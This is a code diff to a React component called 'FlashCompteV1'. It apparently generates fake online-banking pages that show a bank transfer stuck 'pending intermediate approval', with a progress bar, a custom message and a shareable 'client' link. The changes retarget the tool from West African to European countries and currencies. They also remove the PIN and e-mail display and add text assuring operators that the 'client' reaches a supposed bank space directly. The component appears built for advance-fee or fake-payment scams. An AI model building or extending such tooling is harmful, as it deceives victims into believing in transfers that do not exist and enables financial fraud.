@@ -59,7 +59,7 @@ export default function FlashCompteV1({
 
   const [senderBank, setSenderBank] = useState('');
   const [amount, setAmount] = useState('');
-  const [currency, setCurrency] = useState('FCFA (XOF)');
+  const [currency, setCurrency] = useState('EUR (€)');
   const [startPercentage, setStartPercentage] = useState(15);
   const [stopPercentage, setStopPercentage] = useState(85);
   const [customMessage, setCustomMessage] = useState('Virement en attente d\'approbation intermédiaire.');
@@ -312,15 +312,15 @@ export default function FlashCompteV1({
                       className="w-full bg-slate-950 border border-slate-820 rounded-xl px-3.5 py-2.5 text-xs text-slate-300 focus:outline-none focus:border-blue-500 font-medium cursor-pointer"
                     >
                       <option value="France (+33)">🇫🇷 France (+33)</option>
-                      <option value="Côte d'Ivoire (+225)">🇨🇮 Côte d'Ivoire (+225)</option>
-                      <option value="Guinée (+224)">🇬🇳 Guinée (+224)</option>
-                      <option value="Sénégal (+221)">🇸🇳 Sénégal (+221)</option>
-                      <option value="Mali (+223)">🇲🇱 Mali (+223)</option>
-                      <option value="Bénin (+229)">🇧🇯 Bénin (+229)</option>
-                      <option value="Togo (+228)">🇹🇬 Togo (+228)</option>
-                      <option value="Gabon (+241)">🇬🇦 Gabon (+241)</option>
-                      <option value="Burkina Faso (+226)">🇧🇫 Burkina Faso (+226)</option>
-                      <option value="Cameroun (+237)">🇨🇲 Cameroun (+237)</option>
+                      <option value="Belgique (+32)">🇧🇪 Belgique (+32)</option>
+                      <option value="Suisse (+41)">🇨🇭 Suisse (+41)</option>
+                      <option value="Luxembourg (+352)">🇱🇺 Luxembourg (+352)</option>
+                      <option value="Allemagne (+49)">🇩🇪 Allemagne (+49)</option>
+                      <option value="Espagne (+34)">🇪🇸 Espagne (+34)</option>
+                      <option value="Italie (+39)">🇮🇹 Italie (+39)</option>
+                      <option value="Royaume-Uni (+44)">🇬🇧 Royaume-Uni (+44)</option>
+                      <option value="Portugal (+351)">🇵🇹 Portugal (+351)</option>
+                      <option value="Roumanie (+40)">🇷🇴 Roumanie (+40)</option>
                       <option value="Hongrie (+36)">🇭🇺 Hongrie (+36)</option>
                     </select>
                   </div>
@@ -415,12 +415,9 @@ export default function FlashCompteV1({
                         onChange={(e) => setCurrency(e.target.value)}
                         className="w-full bg-slate-950 border border-slate-820 rounded-xl px-3 py-2.5 text-xs text-slate-300 focus:outline-none focus:border-blue-500 font-bold cursor-pointer"
                       >
-                        <option value="FCFA (XOF)">FCFA XOF (F.CFA)</option>
-                        <option value="FCFA (XAF)">FCFA XAF (F.CFA)</option>
                         <option value="EUR (€)">EUR (€)</option>
                         <option value="USD ($)">USD ($)</option>
                         <option value="RON (lei)">RON (lei) - Leu</option>
-                        <option value="BRL (R$)">BRL (R$) - Real brésilien</option>
                         <option value="HUF (Ft)">HUF (Ft) - Forint hongrois</option>
                       </select>
                     </div>
@@ -789,12 +786,12 @@ export default function FlashCompteV1({
             {/* Immersive Helper Grey Dialog Card from screenshot */}
             <div className="bg-slate-100 rounded-2xl p-4 text-xs text-slate-650 leading-relaxed space-y-3">
               <p>
-                Utilisez le <strong className="text-slate-900 font-bold">lien de connexion</strong> et les <strong className="text-slate-900 font-bold">identifiants</strong> définis ci-dessous pour la connexion à l'accès flash compte client.
+                Le client accède à son espace bancaire <strong className="text-slate-900 font-bold">DIRECTEMENT</strong> et de façon sécurisée en cliquant sur le lien ci-dessous. Aucune page d'authentification supplémentaire ou de code PIN ne lui sera demandé pour se connecter.
               </p>
 
               {/* Login Link Box */}
               <div>
-                <span className="text-slate-700 font-bold block text-[11px] mb-1">Lien de connexion :</span>
+                <span className="text-slate-700 font-bold block text-[11px] mb-1">Lien de connexion direct client :</span>
                 <div className="flex items-center justify-between bg-white border border-slate-200 rounded-lg px-3 py-2 text-xs">
                   <span className="text-slate-800 font-mono select-all truncate shrink">{createdTx.generatedUrl}</span>
                   <button
@@ -803,35 +800,6 @@ export default function FlashCompteV1({
                   >
                     <Copy size={13} />
                   </button>
-                </div>
-              </div>
-
-              {/* Email Credentials */}
-              <div className="space-y-3">
-                <div>
-                  <span className="text-slate-700 font-bold block text-[11px] mb-1">Adresse e-mail :</span>
-                  <div className="flex items-center justify-between bg-white border border-slate-200 rounded-lg px-3 py-2 text-xs">
-                    <span className="text-slate-800 truncate shrink">{createdTx.email}</span>
-                    <button
-                      onClick={() => handleCopyToClipboard(createdTx.email, 'Adresse email copiée !')}
-                      className="p-1 hover:bg-slate-55 rounded text-slate-500 hover:text-slate-800 transition"
-                    >
-                      <Copy size={13} />
-                    </button>
-                  </div>
-                </div>
-
-                <div>
-                  <span className="text-slate-700 font-bold block text-[11px] mb-1">Code Pin :</span>
-                  <div className="flex items-center justify-between bg-white border border-slate-200 rounded-lg px-3 py-2 text-xs">
-                    <span className="text-slate-900 font-bold select-all truncate shrink">{createdTx.codePin}</span>
-                    <button
-                      onClick={() => handleCopyToClipboard(createdTx.codePin, 'Code PIN copié !')}
-                      className="p-1 hover:bg-slate-55 rounded text-slate-500 hover:text-slate-800 transition"
-                    >
-                      <Copy size={13} />
-                    </button>
-                  </div>
                 </div>
               </div>
             </div>
